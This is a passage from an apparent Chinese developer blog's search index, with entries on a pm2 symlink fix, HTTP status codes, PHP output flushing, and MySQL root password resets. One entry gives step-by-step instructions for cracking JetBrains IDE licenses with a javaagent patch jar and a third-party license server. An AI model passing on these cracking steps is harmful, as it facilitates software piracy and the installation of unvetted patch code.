    <content type="text"><![CDATA[使用npm安装pm2 ，发现不能全局使用pm2, 于是想到去 1ln -s node_modules/pm2/bin/pm2 /usr/bin/pm2 但是当执行pm2 命令的时候， 发现出现 Too many levels of symbolic links问题 原来/usr/bin目录下的pm2指向的是./pm2，因此，在做ln的时候只要将文件的完整目录写上去即可： 1ln -s /etc/node_modules/pm2/bin/pm2 /usr/bin/pm2]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议常用状态码]]></title>
    <url>%2Farticles%2FHTTP%E5%8D%8F%E8%AE%AE%E5%B8%B8%E7%94%A8%E7%8A%B6%E6%80%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[状态码说明 状态码 含义 100 客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。 101 服务器已经理解了客户端的请求，并将通过Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade 消息头中定义的那些协议。 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。 102 由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行。 200 请求已成功，请求所希望的响应头或数据体将随此响应返回。 201 请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’。 202 服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。 返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。 203 服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超级。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。 204 服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。 如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。 由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。 205 服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。 与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。 206 服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。 该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。 响应必须包含如下的头部域： Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。 Date ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。 Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。 假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。 任何不支持 Range 以及 Content-Range 头的缓存都禁止缓存206响应返回的内容。 207 由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。 300 被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。 除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。 如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。 301 被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。 新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个301响应的话，接下来的重定向请求将会变成 GET 方式。 302 请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。 303 对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。 新的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 注意：许多 HTTP/1.1 版以前的 浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。 304 如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。 该响应必须包含以下的头信息： Date，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如RFC 2068中规定的一样），缓存机制将会正常工作。 ETag 和/或 Content-Location，假如同样的请求本应返回200响应。 Expires, Cache-Control，和/或Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。 假如某个304响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。 假如接收到一个要求更新某个缓存条目的304响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。 305 被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。 注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。 306 在最新版的规范中，306状态码已经不再被使用。 307 请求的资源现在临时从不同的URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 新的临时性的URI 应当在响应的 Location 域中返回。除非这是一个HEAD 请求，否则响应的实体中应当包含指向新的URI 的超链接及简短说明。因为部分浏览器不能识别307响应，因此需要添加上述必要信息以便用户能够理解并向新的 URI 发出访问请求。 如果这不是一个GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 400 1、语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。 2、请求参数有误。 401 当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。参见RFC 2617。 402 该状态码是为了将来可能的需求而预留的。 403 服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。 404 请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。 405 请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。 鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。 406 请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。 除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。 407 与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。参见RFC 2617。 408 请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。 409 由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。 冲突通常发生于对 PUT 请求的处理中。例如，在采用版本检查的环境下，某次 PUT 提交的对特定资源的修改请求所附带的版本信息与之前的某个（第三方）请求向冲突，那么此时服务器就应该返回一个409错误，告知用户请求无法完成。此时，响应实体中很可能会包含两个冲突版本之间的差异比较，以便用户重新提交归并以后的新版本。 410 被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用404状态码。除非额外说明，否则这个响应是可缓存的。 410响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样，410响应也被用于通知客户端在当前服务器站点上，原本属于某个个人的资源已经不再可用。当然，是否需要把所有永久不可用的资源标记为’410 Gone’，以及是否需要保持此标记多长时间，完全取决于服务器拥有者。 411 服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。 412 服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。 413 服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。 414 请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括： 本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。 重定向URI “黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。 客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[1]。没有此类漏洞的服务器，应当返回414状态码。 415 对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。 416 如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。 假如 Range 使用的是字节范围，那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回416状态码的同时，包含一个 Content-Range 实体头，用以指明当前资源的长度。这个响应也被禁止使用 multipart/byteranges 作为其 Content-Type。 417 在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。 421 从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。 422 从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。 422 请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）423 Locked 当前资源被锁定。（RFC 4918 WebDAV） 424 由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV） 425 在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。 426 客户端应当切换到TLS/1.0。（RFC 2817） 449 由微软扩展，代表请求应当在执行完适当的操作后进行重试。 500 服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器的程序码出错时出现。 501 服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。 502 作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。 503 由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理500响应的方式处理它。 注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。 504 作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。 注意：某些代理服务器在DNS查询超时时会返回400或者500错误 505 服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。 506 由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。 507 服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918) 509 服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。 510 获取资源所需要的策略并没有没满足。（RFC 2774） DEMO123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?phpsend_http_status(404);/*** HTTP Protocol defined status codes* HTTP协议状态码,调用函数时候只需要将$num赋予一个下表中的已知值就直接会返回状态了。* @param int $num*/function send_http_status($num) &#123; $http = array ( 100 =&gt; "HTTP/1.1 100 Continue", 101 =&gt; "HTTP/1.1 101 Switching Protocols", 200 =&gt; "HTTP/1.1 200 OK", 201 =&gt; "HTTP/1.1 201 Created", 202 =&gt; "HTTP/1.1 202 Accepted", 203 =&gt; "HTTP/1.1 203 Non-Authoritative Information", 204 =&gt; "HTTP/1.1 204 No Content", 205 =&gt; "HTTP/1.1 205 Reset Content", 206 =&gt; "HTTP/1.1 206 Partial Content", 300 =&gt; "HTTP/1.1 300 Multiple Choices", 301 =&gt; "HTTP/1.1 301 Moved Permanently", 302 =&gt; "HTTP/1.1 302 Found", 303 =&gt; "HTTP/1.1 303 See Other", 304 =&gt; "HTTP/1.1 304 Not Modified", 305 =&gt; "HTTP/1.1 305 Use Proxy", 307 =&gt; "HTTP/1.1 307 Temporary Redirect", 400 =&gt; "HTTP/1.1 400 Bad Request", 401 =&gt; "HTTP/1.1 401 Unauthorized", 402 =&gt; "HTTP/1.1 402 Payment Required", 403 =&gt; "HTTP/1.1 403 Forbidden", 404 =&gt; "HTTP/1.1 404 Not Found", 405 =&gt; "HTTP/1.1 405 Method Not Allowed", 406 =&gt; "HTTP/1.1 406 Not Acceptable", 407 =&gt; "HTTP/1.1 407 Proxy Authentication Required", 408 =&gt; "HTTP/1.1 408 Request Time-out", 409 =&gt; "HTTP/1.1 409 Conflict", 410 =&gt; "HTTP/1.1 410 Gone", 411 =&gt; "HTTP/1.1 411 Length Required", 412 =&gt; "HTTP/1.1 412 Precondition Failed", 413 =&gt; "HTTP/1.1 413 Request Entity Too Large", 414 =&gt; "HTTP/1.1 414 Request-URI Too Large", 415 =&gt; "HTTP/1.1 415 Unsupported Media Type", 416 =&gt; "HTTP/1.1 416 Requested range not satisfiable", 417 =&gt; "HTTP/1.1 417 Expectation Failed", 500 =&gt; "HTTP/1.1 500 Internal Server Error", 501 =&gt; "HTTP/1.1 501 Not Implemented", 502 =&gt; "HTTP/1.1 502 Bad Gateway", 503 =&gt; "HTTP/1.1 503 Service Unavailable", 504 =&gt; "HTTP/1.1 504 Gateway Time-out" ); header($http[$num]);&#125;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Jetbrains系列产品最新激活方法[持续更新]]]></title>
    <url>%2Farticles%2FJetbrains%E7%B3%BB%E5%88%97%E4%BA%A7%E5%93%81%E6%9C%80%E6%96%B0%E6%BF%80%E6%B4%BB%E6%96%B9%E6%B3%95%5B%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5D%2F</url>
    <content type="text"><![CDATA[http://idea.lanyus.com/ 该作者已不提供激活码服务 2019年12月3日更新: 此 IDEA 激活破解教程，在版本PhpStorm-2019.3亲测有效 0、成果展示 123456789101112PhpStorm 2019.3Build #PS-193.5233.101, built on November 28, 2019Licensed to https://zhile.ioSubscription is active until July 8, 2089 # 注意这里有效期至2089/08/08Runtime version: 11.0.4+10-b520.11 amd64VM: OpenJDK 64-Bit Server VM by JetBrains s.r.oWindows 10 10.0GC: ParNew, ConcurrentMarkSweepMemory: 984MCores: 4Registry: run.processes.with.pty=TRUENon-Bundled Plugins: com.intellij.ideolog, ru.adelf.idea.dotenv 注意：无需改动 host 文件 操作步骤如下： 1、Edit Custom VM Options 打开已经安装好的 IDEA, 我们选择 30 天免费试用，先进去再说： 成功进入 IDEA 以后，我们随便创建一个项目/或者打开个旧的项目，点击顶部的 Help 菜单 -&gt; Edit Custom VM Options： 2、添加破解补丁 打开后，我们在最后一行添加如下配置： 1-javaagent:D:\JetBrains\PhpStorm 2018.3\jetbrains-agent.jar 注意：D:\JetBrains\PhpStorm 2018.3\jetbrains-agent.jar是存放破解补丁的位置，你可以自定义成自己存放的位置，注意目录中不要带有中文。 3、移除之前的 License 若你的 IDEA 已经使用了老的 License, 注意移除，否则会导致激活不成功。 如没有 Remove License 按钮，则不需要关心，直接看下一步。 4、重启 IDEA 引入破解补丁以后，重启 IDEA。 5、填入激活码 添加的时候，要注意前后是否带有空格，有则需要去掉，点击 OK 按钮。 再次查看 IDEA 的过期时间，你就可以看到已经激活到 2089 年辣~ 祝您学习愉快~ 2020年2月27日更新： 经个别粉丝反映，以上激活方法在某些电脑上不适用，现提供下面一种新的教程, 在PhpStorm-2019.3.3亲测有效 1、回复公众号获取jetbrains-agent-latest.zip包 2、打开PhpStorm，把上一步下载的压缩包（注意不要解压）直接拖放到Phpstorm中， 3、并点击restart，之后PhpStorm会自动重启 4、重启之后，点击为PhpStorm安装jetbrains-agent，之后点击是(Y)，PhpStorm将会自动重启并激活 在以下IDE版本测试可成功激活（v3.0.3）： IntelliJ IDEA 2019.3.3及以下 AppCode 2019.3.5及以下 CLion 2019.3.4及以下 DataGrip 2019.3.3及以下 GoLand 2019.3.3及以下 PhpStorm 2019.3.3及以下 PyCharm 2019.3.3及以下 Rider 2019.3.4及以下 RubyMine 2019.3.3及以下 WebStorm 2019.3.3及以下 TIPS： 如果IDE不能试用，试试重置脚本(回复公众号获取)。 至于ReSharper，请务必试试这个方法：传送门！ 新的 agent license server：https://fls.jetbrains-agent.com（HTTP也可用） 本jetbrains-agent自始至终都是免费使用，如果有你发现有人盗取牟利，请拒绝并不遗余力地在一切平台举报投诉他！ 注意：因某些限制，最新激活码、破解补丁已放置在笔者公众号上，请关注微信公众号: e攻城狮, 回复关键字：idea, 即可免费获取激活码、破解补丁，持续更新中~。 本项目只做个人学习研究之用，不得用于商业用途！若资金允许，请点击链接购买正版，谢谢合作！学生凭学生证可免费申请正版授权！创业公司可5折购买正版授权！]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[采用PHP实现”服务器推”技术的聊天室]]></title>
    <url>%2Farticles%2F%E9%87%87%E7%94%A8PHP%E5%AE%9E%E7%8E%B0-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8-%E6%8A%80%E6%9C%AF%E7%9A%84%E8%81%8A%E5%A4%A9%E5%AE%A4%2F</url>
    <content type="text"><![CDATA[传统的B/S结构的应用程序，都是采用”客户端拉”结束来实现客户端和服务器端的数据交换。本文将通过结合Ticks(可以参看我的另外一篇文章：关于PHP你可能不知道的－PHP的事件驱动化设计)，来实现一个服务器推的PHP聊天室简单构想。 PHPer，尤其是用过set_cookie, header的，一定见过这样的提示信息：”Warning: Cannot modify header information – headers already sent by…..”, 这是因为通过HTTP协议通信，数据包会包含俩个部分，一个是Header,一个是data。一般来说，都是先Header部分，在Heaer部分指明了 Data部分的长度，然后使用\r\n\r\n来表示header部分结束，接下来是Data部分。 当我们有任何输出的时候，Header部分就发送了，这个时候，你再想header函数来改变一些Header部分的域信息，就会得到上面的提示信息。 一个简单的办法就是使用output_buffering。让它来缓存服务器的输出，不要太早将Header部分发给客户端。 那么，如果不使用output_buffering，是不是就可以实现，每当服务器有输出，就立即发送给客户端呢？ 做个如下试验： 1234567//设置php.ini中output_buffering=0 或者使用ob_end_flush()关闭缓存set_time_limit(0);for($i=0;$i&lt;10;$i++)&#123; echo "Now Index is :". $i; sleep(1);&#125; 结果我们发现，还是要等到脚本全部执行完以后，才能一次看到所有的结果。。 为什么呢？ 这是因为我们只是解决了缓存问题，但是还有一个缓冲问题，PHP会缓冲程序的输出。所以，这个时候，我们还需要调用，flush(), 来强制使得PHP将所有的程序输出发送给客户端。 12345678910set_time_limit(0);//设置php.ini中output_buffering=0ob_end_flush();//关闭缓存set_time_limit(0);for($i=0;$i&lt;10;$i++)&#123; echo "Now Index is :". $i; flush(); sleep(1);&#125; 现在是不是看到了，不断有服务器的数据显示出来(如果看不到, 可以在输出前填充相当数量的占位字符)? 有几个概念之间的关系，我这里补充以下： 在代码中使用ob_start(), 就相当于在php.ini中使用output_buffering=on一样，使用服务器缓存。 在代码中使用ob_end_flush() 就相当于在php.ini中使用output_buffering = false一样，关闭服务器缓存. 基于前面的讨论，我们就有可能使用Ticks来实现，一个无刷新，无ajax的聊天室: 页面中包含俩个iframe,一个是不断获取聊天室的聊天内容，一个包含用户发表聊天内容的form. 这样，在第一个frame的脚本中： 1234567891011121314151617181920ob_end_clean();//关闭缓存set_time_limit(0);ob_implicit_flush(); //这个语句将强制每当有输出就自动刷新，相当于在每个echo后，调用ob_flush()$new_mesg = NULL;register_tick_function("getNewMesg");declare(ticks=1)&#123; while(1)&#123; if(!is_null($new_mesg))&#123; foreach($new_mesg as $msg)&#123; echo $msg; &#125; $new_mesg = null; &#125; &#125;&#125;function getNewMesg()&#123;//通过查询数据库，或者共享内存，来获取现在的聊天室大厅的内容。//返回一个数组，包含所有的新的聊天内容&#125; 这样就实现了一个简单的使用服务器推技术的聊天室的框架。 当然，关于实时输出，还有一些其他的限制，比如在PHP5手册中讲到的： 个别web服务器程序，特别是Win32下的web服务器程序，在发送结果到浏览器之前，仍然会缓存脚本的输出，直到程序结束为止。 有些Apache的模块，比如mod_gzip，可能自己进行输出缓存，这将导致flush()函数产生的结果不会立即被发送到客户端浏览器。 甚至浏览器也会在显示之前，缓存接收到的内容。例如 Netscape 浏览器会在接受到换行或 html 标记的开头之前缓存内容，并且在接受到 标记之前，不会显示出整个表格。 一些版本的 Microsoft Internet Explorer 只有当接受到的256(甚至更多)个字节以后才开始显示该页面，所以必须发送一些额外的空格来让这些浏览器显示页面内容。 接下来，我贴一个很有趣的代码，有兴趣的同学，可以试试： 123456789101112131415header("Content-type: multipart/x-mixed-replace;boundary=endofsection");print "--endofsection\n";$pmt = array("-", "\\", "|", "/" );for( $i = 0; $i &lt;10;$i ++ )&#123; sleep(1); print "Content-type: text/plain\n\n"; print "Part $i ".$pmt[$i % 4]; print "--endofsection\n"; ob_flush(); //强制将缓存区的内容输出 flush(); //强制将缓冲区的内容发送给客户端&#125;print "Content-type: text/plain\n\n";print "The end\n";print "–endofsection–\n"; 使用firefox打开，看看你看到了什么。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[生成固定长随机码]]></title>
    <url>%2Farticles%2F%E7%94%9F%E6%88%90%E5%9B%BA%E5%AE%9A%E9%95%BF%E9%9A%8F%E6%9C%BA%E7%A0%81%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637function R() &#123; $code = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; $rand = $code[rand(0,25)] .strtoupper(dechex(date('m'))) .date('d').substr(time(),-5) .substr(microtime(),2,5) .sprintf('%02d',rand(0,99)); for( $a = md5( $rand, true ), $s = '0123456789ABCDEFGHIJKLMNOPQRSTUV', $d = '', $f = 0; $f &lt; 8; $g = ord( $a[ $f ] ), $d .= $s[ ( $g ^ ord( $a[ $f + 8 ] ) ) - $g &amp; 0x1F ], $f++ ); return $d;&#125;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL修改root密码的4种方法(以windows为例)]]></title>
    <url>%2Farticles%2FMySQL%E4%BF%AE%E6%94%B9root%E5%AF%86%E7%A0%81%E7%9A%844%E7%A7%8D%E6%96%B9%E6%B3%95-%E4%BB%A5windows%E4%B8%BA%E4%BE%8B-%2F</url>
    <content type="text"><![CDATA[方法1： 用SET PASSWORD命令 首先登录MySQL。 格式：set password for 用户名@localhost = password(&#39;新密码&#39;); 例子：set password for root@localhost = password(&#39;123&#39;); 方法2：用mysqladmin 格式：mysqladmin -u用户名 -p旧密码 password 新密码 例子：mysqladmin -uroot -p123456 password 123 方法3：用UPDATE直接编辑user表 首先登录MySQL。 12345mysql&gt; use mysql;mysql&gt; update user set password=password('123') where user='root' and host='localhost';mysql&gt; flush privileges; 方法4：在忘记root密码的时候，可以这样 以windows为例： 关闭正在运行的MySQL服务。 打开DOS窗口，转到mysql\bin目录。 输入mysqld –skip-grant-tables 回车。–skip-grant-tables 的意思是启动MySQL服务的时候跳过权限表认证。 再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），转到mysql\bin目录。 输入mysql回车，如果成功，将出现MySQL提示符 &gt;。 连接权限数据库： use mysql; 。 改密码：update user set password=password(“123”) where user=”root”;（别忘了最后加分号） 。 刷新权限（必须步骤）：flush privileges; 。 退出 quit。 注销系统，再进入，使用用户名root和刚才设置的新密码123登录。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP编译安装时常见错误解决办法]]></title>
    <url>%2Farticles%2FPHP%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%97%B6%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
